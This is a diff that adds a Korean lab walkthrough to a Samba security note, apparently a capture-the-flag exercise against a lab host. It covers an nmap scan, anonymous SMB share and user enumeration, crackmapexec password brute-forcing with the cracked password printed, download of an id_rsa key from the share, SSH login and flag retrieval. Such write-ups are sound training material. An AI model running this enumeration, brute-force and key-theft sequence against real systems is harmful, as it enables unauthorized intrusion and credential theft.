@@ -75,6 +75,144 @@ $ cat /etc/samba/smb.conf | grep -v "#\|\;" # (주석/세미콜론 라인 제외
 | create mask = 0777 / directory mask = 0777 | 과도한 권한 부여 |
 | unix password sync = yes / pam password change | 계정 동기화 위험 |
 
+---
 
 # 실습
 
+## Portscan
+
+먼저 대상 Host(`10.129.203.6`)에 대해 기본 스크립트와 서비스 버전 탐지를 수행하였다.
+
+```bash
+$ nmap -sC -sV 10.129.203.6                     
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-26 02:33 EDT
+Nmap scan report for 10.129.203.6
+Host is up (0.28s latency).
+Not shown: 995 closed tcp ports (reset)
+PORT     STATE SERVICE     VERSION
+22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 71:08:b0:c4:f3:ca:97:57:64:97:70:f9:fe:c5:0c:7b (RSA)
+|   256 45:c3:b5:14:63:99:3d:9e:b3:22:51:e5:97:76:e1:50 (ECDSA)
+|_  256 2e:c2:41:66:46:ef:b6:81:95:d5:aa:35:23:94:55:38 (ED25519)
+53/tcp   open  domain      ISC BIND 9.16.1 (Ubuntu Linux)
+| dns-nsid: 
+|_  bind.version: 9.16.1-Ubuntu
+139/tcp  open  netbios-ssn Samba smbd 4
+445/tcp  open  netbios-ssn Samba smbd 4
+2121/tcp open  ftp
+| fingerprint-strings: 
+|   GenericLines: 
+|     220 ProFTPD Server (InlaneFTP) [10.129.203.6]
+|     Invalid command: try being more creative
+|_    Invalid command: try being more creative
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port2121-TCP:V=7.95%I=7%D=9/26%Time=68D633C4%P=x86_64-pc-linux-gnu%r(Ge
+SF:nericLines,8B,"220\x20ProFTPD\x20Server\x20\(InlaneFTP\)\x20\[10\.129\.
+SF:203\.6\]\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20creat
+SF:ive\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20creative\r
+SF:\n");
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: 1s
+|_nbstat: NetBIOS name: ATTCSVC-LINUX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2025-09-26T06:34:01
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 77.27 seconds
+```
+
+
+Nmap 스캔을 통해 `SSH`, `DNS`, `SMB`, `FTP` 등 총 5개의 주요 서비스가 확인되었으며,
+특히 **Samba 공유(139/445)** 는 인증 우회, 익명 접근 시도를 통해
+파일 획득이나 초기 침투 지점으로 활용될 가능성이 있다.
+
+
+## SMB File share
+
+`smbclient` 를 이용해 대상 서버의 공유 목록을 확인하였다. `-L` 옵션은 **서버의 공유(share) 목록을 열람**하기 위한 것이고, `-N` 옵션은 **null 세션(익명 세션)으로 접속**하도록 지정한다.
+
+```bash
+$ smbclient -N -L //10.129.203.6 
+```
+
+위 명령을 실행하면 다음과 같이 공유 목록이 출력된다.
+
+![Domain](/assets/network-screenshots/smb/file-share.png)
+
+이후 `smbmap`명령어를 이용하여 **각 공유에 대한 접근 가능 여부**를 테스트하였다.
+
+```bash
+$ smbmap -H 10.129.203.6 -r GGJ
+```
+
+GGJ 폴더가 접근이 가능한 상태였고, `-r` 옵션을 활용하여 GGJ 공유 폴더 내부에 있는 파일들을 열람하였다.
+
+![Domain](/assets/network-screenshots/smb/smbmap.png)
+
+## rpcclient
+
+`smbmap` 결과에서 **`id_rsa` 파일이 존재함**을 확인하였다.  
+이후 `rpcclient` 명령어를 사용하여 SMB 공유 폴더의 **사용자 계정 정보를 수집**하였다.
+
+```bash
+$ rpcclient -U "" 10.129.203.6
+```
+
+명령어 실행 후 `enumdomusers` 명령어를 통하여 smb 사용자의 대한 정보를 열람 하였다. 
+그 결과, 사용자 명은 `jason`, `robin` 이 존재함을 확인하였다.
+
+![Domain](/assets/network-screenshots/smb/rpcclient.png)
+
+이 후, `crackmapexec` 명령어를 사용하여 `jason` 사용자의 비밀번호 브루트 포싱을 시도하였다.
+
+`--local-auth` 옵션은 **도메인 계정이 아닌 로컬 계정 인증**을 강제하기 위해 사용한다.
+
+```bash
+$ crackmapexec smb 10.129.203.6 -u jason -p pws.list --local-auth
+```
+
+![Domain](/assets/network-screenshots/smb/brute-force.png)
+
+브루트 포싱 결과, `jason`의 계정 비밀번호가 `34c8zuNBo91!@28Bszh` 와 일치함을 확인하였다.
+
+## File download
+
+`smbmap` 명령어를 이용하여 `id_rsa` 의 파일을 로컬로 다운로드 하였다.
+
+```bash
+$ smbmap -u 'jason' -p '34c8zuNBo91!@28Bszh' -H 10.129.203.6 -r GGJ -A id_rsa
+```
+
+## SSH connect
+
+우선 먼저 `chmod` 명령어를 이용하여 `id_rsa` 키의 권한을 `600`으로 설정하였다.
+
+```bash
+$ chmod 600 10.129.203.6-GGJ_id_rsa
+```
+
+이후, 아까 확인 한 `nmap` 결과에서 **SSH(포트 22)** 가 열려 있음을 확인하고, 획득한 `id_rsa` 개인키를 사용해 `jason` 계정으로 SSH 접속을 시도하였다.
+
+```bash
+$ ssh -i 10.129.203.6-GGJ_id_rsa jason@10.129.203.6
+```
+
+`jason` 사용자의 SSH 접속에 성공하였다.
+
+![Domain](/assets/network-screenshots/smb/ssh-connect.png)
+
+## Flag 획득
+
+원격 호스트에서 `ls` 명령어를 사용하여 내부 디렉토리 파일들을 확인하니, `flag.txt` 라는 파일이 존재하였다. 
+이 파일을 열람한 결과, 
+
+![Domain](/assets/network-screenshots/smb/flag.png)
+
+이렇게 최종적으로 **flag**를 확보할 수 있었다.
